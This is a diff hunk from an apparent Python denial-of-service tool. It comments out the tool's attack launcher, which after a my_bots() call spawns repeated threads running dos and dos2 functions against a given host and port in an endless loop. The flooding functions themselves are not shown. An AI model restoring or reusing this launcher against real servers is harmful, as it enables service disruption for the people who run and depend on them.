@@ -138,32 +138,34 @@ if __name__ == '__main__':
     print("\033[92m", host, " port: ", str(port), " turbo: ", str(thr), "\033[0m")
     print("\033[94mPlease wait...\033[0m")
     user_agent()
-    my_bots()
-    time.sleep(5)
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((host, int(port)))
-        s.settimeout(1)
-    except socket.error as e:
-        print("\033[91mcheck server ip and port\033[0m")
-        usage()
-    while True:
-        for i in range(int(thr)):
-            t = threading.Thread(target=dos)
-            t.daemon = True  # if thread is exist, it dies
-            t.start()
-            t2 = threading.Thread(target=dos2)
-            t2.daemon = True  # if thread is exist, it dies
-            t2.start()
-        start = time.time()
-        # tasking
-        item = 0
-        while True:
-            if (item > 1800):  # for no memory crash
-                item = 0
-                time.sleep(.1)
-            item = item + 1
-            q.put(item)
-            w.put(item)
-        q.join()
-        w.join()
+
+    print()
+    # my_bots()
+    # time.sleep(5)
+    # try:
+    #     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    #     s.connect((host, int(port)))
+    #     s.settimeout(1)
+    # except socket.error as e:
+    #     print("\033[91mcheck server ip and port\033[0m")
+    #     usage()
+    # while True:
+    #     for i in range(int(thr)):
+    #         t = threading.Thread(target=dos)
+    #         t.daemon = True  # if thread is exist, it dies
+    #         t.start()
+    #         t2 = threading.Thread(target=dos2)
+    #         t2.daemon = True  # if thread is exist, it dies
+    #         t2.start()
+    #     start = time.time()
+    #     # tasking
+    #     item = 0
+    #     while True:
+    #         if (item > 1800):  # for no memory crash
+    #             item = 0
+    #             time.sleep(.1)
+    #         item = item + 1
+    #         q.put(item)
+    #         w.put(item)
+    #     q.join()
+    #     w.join()
